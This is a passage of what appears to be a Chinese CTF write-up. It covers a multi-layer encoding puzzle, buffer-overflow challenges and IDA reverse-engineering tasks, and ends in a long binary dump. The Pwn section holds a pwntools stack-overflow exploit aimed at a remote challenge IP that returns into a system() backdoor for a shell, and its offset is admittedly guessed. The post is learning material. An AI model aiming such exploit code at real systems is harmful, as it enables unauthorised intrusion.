<p><a class="link"   href="https://www.cnblogs.com/crazylqy/p/10184291.html" >unicode编码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/zhaoyanjun6/article/details/120285594" >AES加密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="编码的叠加态"><a href="#编码的叠加态" class="headerlink" title="编码的叠加态"></a>编码的叠加态</h3><p>题目提示了解码顺序是：base32，hex，base64，颜文字，莫斯电码和keyboard</p>
<p>一开始没注意提示，下载文件后看到结尾的&#x3D;&#x3D;就试着用base64解码了一下，结果失败了</p>
<p>颜文字密码是”AAencode”，一个JavaScript的神奇实现，按理来说本地浏览器的控制台应该也能跑，但一直报错，只能靠解码网站：<a class="link"   href="http://www.atoolbox.net/Tool.php?Id=703" >AAEncode加密&#x2F;解密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>然后是莫斯电码，先删除末尾的封号，最初版本的文件是有点问题的，LIP的I那里出错了。莫斯电码解码出来得到的密文要用”keyboard”解码，一开始以为是对照键盘位置做字母代换：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">letters=[<span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">letter=[<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;t&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">k=<span class="built_in">len</span>(s)</span><br><span class="line">s2=s.lower()</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a2q</span>(<span class="params">s2</span>):</span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        <span class="keyword">if</span> s2[i]==<span class="string">&#x27;-&#x27;</span> <span class="keyword">or</span> s2[i]==<span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            s1=s1+s2[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s1= s1+letters[<span class="built_in">ord</span>(s2[i])-<span class="number">97</span>]</span><br><span class="line">    <span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2a</span>(<span class="params">s2</span>):</span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        <span class="keyword">if</span> s2[i]==<span class="string">&#x27;-&#x27;</span> <span class="keyword">or</span> s2[i]==<span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            s1=s1+s2[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s1= s1+letter[<span class="built_in">ord</span>(s2[i])-<span class="number">97</span>]</span><br><span class="line">    <span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line">a2q(s2)</span><br><span class="line">q2a(s2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>结果得不到有效的文字，然后又跑了一遍凯撒，还是不行。后来找到了另一种”keyboard”密码：<a class="link"   href="https://zhuanlan.zhihu.com/p/222691227" >CTF古典密码学 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，居然是键盘围绕的字母得出明文，属实脑洞大开，最后得到明文，但是包装成flag还需要尝试一下格式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WDR-BHM-NKUH-ILP-THU-THU-LIP-YJI-EFT-AXDW-WSR-POK-DCGR</span><br><span class="line"></span><br><span class="line">e-n-j-o-y-y-o-u-r-s-e-l-f</span><br><span class="line">r00t&#123;ENJOY_YOURSELF&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="EasyOverflow"><a href="#EasyOverflow" class="headerlink" title="EasyOverflow"></a>EasyOverflow</h3><p>怪怪的…只要往密码里输入’password’就能得到flag，不是很懂为什么hhhh，所以溢出了个啥呢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539741.png"
                     
                ></p>
<p>听出题人说这题因为username只能读取9位，多的会覆盖原有的密码（直接替换不拼接），所以溢出的最多8位是可控的密码，比如你在username中输入”123456789abcdefgh”，那么密码栏就输入”abcdefgh”即可。</p>
<h3 id="EasyOverflow2（未解出）"><a href="#EasyOverflow2（未解出）" class="headerlink" title="EasyOverflow2（未解出）"></a>EasyOverflow2（未解出）</h3><p>这是一个pwn的简单的栈溢出，拖进ida分析会看见一个system后门与一个可能造成溢出的get函数，目标就是调用get函数时用输入填满栈空间覆盖原有内容，然后覆盖ebp，最后再覆盖eip，将跳转的system函数的调用地址传入到原本eip存储栈返回地址的地方，从而执行eip拿到shell。</p>
<p>以上是基本思路，可以使用python的pwntools构造exp，remote提供远程连接，构造payload，需要先得出偏移量，也就是函数开始到eip的地址差值，用无用数据将其填满，然后再将要跳转的地址传进去，p32表示将数据压缩成bytes类型，这里没有弄明白到底如何得到偏移量就随便填了一个，<code>sendline</code> 函数发送一行的内容，会自动加上换行符，<code>send</code> 函数则会原样发送，<code>interactive</code> 会进入shell式的交互界面（也就是与nc的目标进行交互），结束后用 <code>close</code> 关闭连接。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;81.69.243.226&quot;</span>,<span class="number">30012</span>)</span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x1449</span>+p32(<span class="number">0x401278</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure></div>

<p>所以这题真正的难点在于如何判断出偏移量和后门函数的地址。我一开始像在ida中看函数的栈调用情况，但是没有整明白，网上很多exp的思路用的都是gdb的调试动态查找地址情况，其实ida也可以调试，但本题的程序只能在linux环境中运行，所以ida中没有”windows debugger”，而且用pwntools连接本地的pwn程序，<code>process</code> 会报错也是这个原因，所以只能在linux环境下用dbg调试才能得到偏移量，但本地的wsl包管理出了点问题，不是很熟悉linux命令，暂时还配置不了环境；远程的服务器也是类似原因暂时无法配置环境，最后的思路是直接实测，通过不断输入变大的payload测试溢出点，但是出现了很奇怪的情况，开始看似溢出的点后来发现又没有溢出，可是payload已经很大了，因为没有类似的经验，我也不是很清楚溢出的实际效果，所以最后只能暂时作罢，没能解出flag，只是记录一下自己的思路。</p>
<ul>
<li>“.dll”为动态链接库，是windows的可执行文件；”.lib”是静态链接库，可执行文件；Windows下PE指示可执行，Linux下ELF指示可执行</li>
</ul>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://www.freebuf.com/articles/system/253225.html" >栈溢出的原理以及EXP的编写 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_43833642/article/details/104181681" >pwntools的安装与基本使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="http://c.biancheng.net/view/8130.html" >GDB下载及安装教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://oi.men.ci/gnu-debugger/" >GDB入门教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/25816426" >Jwizard-栈溢出从入门到放弃 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Too-Much-Chaos"><a href="#Too-Much-Chaos" class="headerlink" title="Too Much Chaos"></a>Too Much Chaos</h3><p>给了一个能跑出flag的C++程序，里面有各种错误，包括语法，死循环，算法错误，修复后即可得到flag，需要说明的是不会报错的错误如算法实现失败，main函数拼成mian（程序找不到main函数在VSC中会导致生成不了exe从而导致无法运行）等。难度不大，仔细观察即可。</p>
<h3 id="AT-FILED"><a href="#AT-FILED" class="headerlink" title="AT.FILED"></a>AT.FILED</h3><p>就是简单的大小写置换，但是’e’不会被转换成’E’，因此根据给出的结果反推输入时会有多解。根据置换后的结果，反推置换前的输入，就能得到一个正确的flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">YoUR_fLAG_Is_HeRE</span><br></pre></td></tr></table></figure></div>

<h3 id="Zebra"><a href="#Zebra" class="headerlink" title="Zebra"></a>Zebra</h3><p>这道题丢进IDA64后先找main函数，然后发现是一个检验运算，输入一串10检验是否与unsigned数组c中的内容相等，经过分析就是将unsigned数组中的数值写成四位的二进制并展开，因此要看unsigned数组中的内容如何，通过地址来到数组的内容界面，由于unsigned的大小是四个字节，在hexview中调整format为unsigned，4bytes，然后计算数组的地址范围：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">40F020</span><br><span class="line">	2400</span><br><span class="line">411420</span><br></pre></td></tr></table></figure></div>

<p>在计算机中地址随内存的增大是从低往高增长的，地址的单位就是字节，以十六进制的形式表示，一个字节是两位十六进制，而c数组是一个unsigned的数组，在C++中可以用sizeof测试一下它的大小是4个字节，所以每4位地址存储一个unsigned数据，在一个数据内部是从高位往低位读值的，因此在读取数组内容时将格式调整成4Bytes的Unsigned数据，可以直接读取它的值而不用自己处理。函数 <code>memcpy()</code> 将地址”&amp;unk_40F020”的内容赋给数组c，2304大小的unsigned数组占用字节数是9216，转化为十六进制是2400；双击地址”&amp;unk_40F020”可以跳转到相应地址界面看到地址内容</p>
<p>再将这部分的数值复制出来丢到脚本中转化一下：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fstream infile,outfile;</span><br><span class="line">    infile.<span class="built_in">open</span>(<span class="string">&quot;./msg.txt&quot;</span>,ios::in);</span><br><span class="line">    outfile.<span class="built_in">open</span>(<span class="string">&quot;./reres.txt&quot;</span>,ios::out);</span><br><span class="line">    string tmp,res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2304</span>;i++)&#123;</span><br><span class="line">        infile&gt;&gt;num;</span><br><span class="line">        string ss=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            ss=<span class="built_in">char</span>((num%<span class="number">2</span>)+<span class="number">48</span>)+ss;</span><br><span class="line">            num/=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res=res+ss;</span><br><span class="line">    &#125;</span><br><span class="line">    outfile&lt;&lt;res;</span><br><span class="line">    infile.<span class="built_in">close</span>();</span><br><span class="line">    outfile.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>数组c的内容存放在”msg.txt”中，C++中严格区分单双引号，单引号内被视为字符类型，双引号内被视为字符串类型。得到的内容如果想拿到程序中检验需要加上空格并分批输入，一起输入它读取不了那么多…检验后发现是正确的，因此就直接取没有空格的版本，得到如下10序列：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 </span><br><span class="line">0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 </span><br><span class="line">0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 </span><br><span class="line">0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 </span><br><span class="line">0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 